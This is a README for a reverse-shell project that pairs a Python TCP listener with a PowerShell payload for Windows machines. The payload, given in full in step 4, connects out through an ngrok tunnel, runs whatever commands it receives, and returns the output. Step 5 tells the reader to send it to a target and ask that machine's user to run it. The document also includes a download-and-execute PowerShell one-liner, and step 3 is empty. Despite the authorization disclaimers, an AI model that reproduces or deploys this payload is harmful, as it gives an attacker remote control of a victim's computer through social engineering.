# Reverse Shell with Python and PowerShell

> **Warning**  
> This tool is intended strictly for educational, authorized, or penetration testing uses. Do **NOT** use this project for unauthorized access, as it may be illegal and unethical. Always obtain proper permission.

---

## Overview

This project demonstrates how to set up a basic Reverse Shell using Python (as a TCP server) and a PowerShell payload for Windows targets.  
Chocolatey is required for the setup process.

---

## Setup Instructions

### 1. Install Chocolatey

Ensure Chocolatey is installed on your Windows machine.

You can install it by running this command in an **elevated (Administrator) PowerShell**:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
```

---

### 2. Start the Python TCP Server

Run the Python server script first:

```bash
python server.py
```

---

### 3. Obtain Your TCP Forwarding Code

In your command prompt, run the following command to install Chocolatey (if not already done) and obtain your **5-digit code** required for ngrok or your tunneling service.

```bash
# Example usage; adjust as necessary for your workflow.
```

---

### 4. Prepare the PowerShell Payload

Replace `**YOUR_CODE**` in the payload below with the 5-digit code you received:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('0.tcp.in.ngrok.io', **YOUR_CODE**);
$stream = $client.GetStream(); 
[byte[]]$bytes = 0..65535|%{0}; 
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close()
```

---

### 5. Deploy the Payload

- Send the above PowerShell payload to the **target Windows machine** (with authorization!).
- Request the user on that machine to run the payload in PowerShell.

---

### 6. Monitor the Server

Check the output of `server.py` on your machine. If everything is set up correctly, you should receive a connection from the target machine.

---

## Notes

- This project is for **education and authorized use only**.
- Always use tools like this in safe, legal, and ethical environments (e.g., your own equipment, with explicit permission).

---



